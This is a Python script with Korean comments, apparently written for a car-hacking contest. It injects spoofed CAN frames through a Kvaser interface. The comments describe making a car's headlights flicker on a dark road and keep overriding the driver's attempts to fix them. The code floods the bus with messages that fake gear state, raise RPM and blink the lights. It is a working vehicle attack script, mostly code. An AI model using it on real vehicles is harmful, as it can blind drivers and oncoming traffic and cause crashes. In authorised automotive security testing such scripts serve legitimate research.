from Kvaser_Tx_Rx import Transmitter
import time

# 4. 조도 센서기반의 라이트 마비 공격 (물리적 공격 포함)
# • 초기요청상태(우리공격전주최측에요청할셋팅):기어단수 P or N,라이트 모드 ON
# • 초기상황(시나리오상 필요한 상황 가정) : 어두운 골목길 주행 상황
# • 라이트가 켜진 상태에서 주행하는 차량에 짧은 주기로 라이트가 깜빡이는 공격을 주입한다.
# • 이때, 운전자는 라이트에 문제가 생겼다는 점을 인지하고 라이트를 조작하려하지만, 우리가 정해놓은 라이트 모드
#   가 유지되도록 공격을 지속적으로 주입하여 손 쓸수 없도록 만든다.
# • 어두운 길에서 라이트가 비정상적으로 작동하면 운전자의 시야 확보에 문제가 생기며 마주보고 오는 운전자의 시야또한 방해할 수 있는 공격이다.

# 라이트를 켠 상태에서 깜빡 거림이 가능한지?
# 라이트를 깜빡였을 때 운전자가 임의로 조작해서 라이트모드가 가능한지?


def attack_section(attack_list, num_msg_list, msg_delay_list, attack_time):
    transmitter = Transmitter()
    cur_num_list = list()
    attack_start = time.perf_counter()
    for i in range(len(attack_list)):
        cur_num_list.append(0)
    while time.perf_counter() < attack_start + attack_time:
        for i in range(len(attack_list)):
            msg_delay_list[i] = time.perf_counter() + msg_delay_list[i]
            if (cur_num_list[i] < num_msg_list[i]) and time.perf_counter() > msg_delay_list[i]:
                transmitter.transmit_data(attack_list[i][0], attack_list[i][1],
                                          attack_list[i][2], attack_list[i][3])
                cur_num_list[i] += 1


if __name__ == '__main__':
    # --------------------------------------------------------------------------
    # 1. D단 체결 메세지
    # 2. RPM 증가

    attackList0 = list()
    attackNumList0 = list()
    attackDelayList0 = list()
    # id, data, interMsgTime, nMsg
    attackList0.append([0x367, '00 00 00 00 05 00 B4 12', 0, 1])
    attackNumList0.append(100)
    attackDelayList0.append(0.01)
    attackList0.append([0x366, '28 E2 FF 28 25 00 11', 0, 1])
    attackNumList0.append(100)
    attackDelayList0.append(0.01)

    attack_section(attackList0, attackNumList0, attackDelayList0, 1)

    # --------------------------------------------------------------------------
    # 1. D단 체결 메세지
    # 2. LED등 깜빡임

    attackList3 = list()
    attackNumList3 = list()
    attackDelayList3 = list()
    # id, data, interMsgTime, nMsg
    attackList3.append([0x367, '00 00 00 00 05 00 B4 12', 0, 1])
    attackNumList3.append(10000)
    attackDelayList3.append(0.002)
    attackList3.append([0x490, '00 00 08 21 00 10 3C 47', 0, 1])
    attackNumList3.append(1000)
    attackDelayList3.append(0.01)

    attack_section(attackList3, attackNumList3, attackDelayList3, 10)

